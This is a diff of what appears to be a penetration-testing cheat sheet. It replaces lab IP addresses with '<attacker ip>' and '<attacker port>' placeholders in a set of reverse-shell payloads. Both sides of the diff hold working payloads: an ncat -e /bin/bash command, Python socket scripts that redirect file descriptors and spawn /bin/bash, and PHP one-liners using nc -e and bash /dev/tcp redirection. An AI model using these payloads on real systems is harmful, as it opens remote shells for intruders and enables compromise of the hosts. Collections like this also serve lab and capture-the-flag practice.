@@ -109,7 +109,7 @@ nmap -p <target port> -sC -sV <target ip>
 ncat 
 
 ```shell
-ncat -e /bin/bash 192.168.10.58 8080
+ncat -e /bin/bash <attacker ip> <attacker port>
 ```
 
 python3(file)
@@ -120,7 +120,7 @@ from os import dup2
 from subprocess import run
 import socket
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("192.168.49.130",80)) 
+s.connect(("<attacker ip>",<attacker port>)) 
 dup2(s.fileno(),0) 
 dup2(s.fileno(),1) 
 dup2(s.fileno(),2) 
@@ -134,7 +134,7 @@ python(file)
 import os
 import sys
 try: 
-        os.system("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.112\",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'") 
+        os.system("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<attacker ip>\",<attacker port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'") 
 except: 
         print 'ERROR...' 
 sys.exit(0) 
@@ -158,11 +158,11 @@ Runtime.getRuntime().exec(cmdline);
 php(file)
 
 ```Php
-<?php system(\"nc -e /bin/bash 192.168.1.100 80\"); ?>
+<?php system(\"nc -e /bin/bash <attacker ip> <attacker port>\"); ?>
 ```
 
 ```Php
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.30/80 0>&1'");?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1'");?>
 ```
 
 ### :open_file_folder: Cron jobs
